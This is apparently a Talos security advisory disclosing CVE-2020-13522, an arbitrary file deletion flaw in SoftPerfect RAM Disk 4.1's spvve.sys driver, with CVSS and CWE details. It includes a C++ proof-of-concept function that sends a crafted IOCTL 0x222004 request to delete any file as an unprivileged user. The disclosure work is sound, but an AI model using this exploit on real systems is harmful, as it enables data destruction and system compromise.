# Talos Vulnerability Report

### TALOS-2020-1121

## SoftPerfect RAM Disk spvve.sys 0x222004 arbitrary file deletion vulnerability

##### August 4, 2020

##### CVE Number

CVE-2020-13522

##### SUMMARY

An exploitable arbitrary file delete vulnerability exists in SoftPerfect RAM Disk 4.1 spvve.sys driver. A specially crafted I/O request packet (IRP) can allow an unprivileged user to delete any file on the filesystem. An attacker can send a malicious IRP to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

SoftPerfect RAM Disk 4.1

##### PRODUCT URLS

RAM Disk - <https://www.softperfect.com/products/ramdisk/>

##### CVSSv3 SCORE

8.8 - CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

##### CWE

CWE-269 - Improper Privilege Management

##### DETAILS

SoftPerfect RAM Disk is a high-performance RAM disk application that allows the user to store a disk from their computer on the device’s space.

The spvve.sys driver creates a device object `Device\SoftPerfectVolume` that is accessible to any user on the system so any user sending specially crafted I/O request packet (IRP) can cause arbitrary file deletion.
This allows a regular user to delete any file in the system:

```
VOID kernelFileDelete(HANDLE hDevice, const wchar_t* filePath)
{
	wchar_t fileName2[] = L"\\DosDevices\\C:\\WINDOWS\\doesnotmatter.ini";

	DWORD DATA_SIZE = 24;
	DWORD someData3 = 0;
	DWORD fileName1Size = wcslen(filePath) * 2;
	const DWORD inBufferSize = DATA_SIZE + fileName1Size + sizeof(fileName2) + someData3;
	const DWORD outBufferSize = 4;
	PBYTE inBuffer = new BYTE[inBufferSize];
	PBYTE outBuffer = new BYTE[outBufferSize];;
	DWORD returned = 0;

	memset(inBuffer, 'A', inBufferSize);
	memcpy(inBuffer + DATA_SIZE, filePath, fileName1Size);
	memcpy(inBuffer + DATA_SIZE + fileName1Size, fileName2, sizeof(fileName2));
	setData<DWORD>(inBuffer, 0, 0x2);
	setData<WORD>(inBuffer, 0x16, fileName1Size);
	setData<WORD>(inBuffer, 5, sizeof(fileName2));
	setData<WORD>(inBuffer, 0x14, someData3); //somedata3
	setData<BYTE>(inBuffer, 4, 1);
	setData<QWORD>(inBuffer, 7, 0);

	DeviceIoControl(hDevice,
		0x222004,
		inBuffer,
		inBufferSize,
		outBuffer,
		outBufferSize,
		&returned,
		0);

	printf("returned bytes : 0x%x\n", returned);
	neolib::hex_dump(outBuffer, returned, std::cout);
	system("PAUSE");

}

```

As a result, the file pointed to by `filePath` will be deleted.
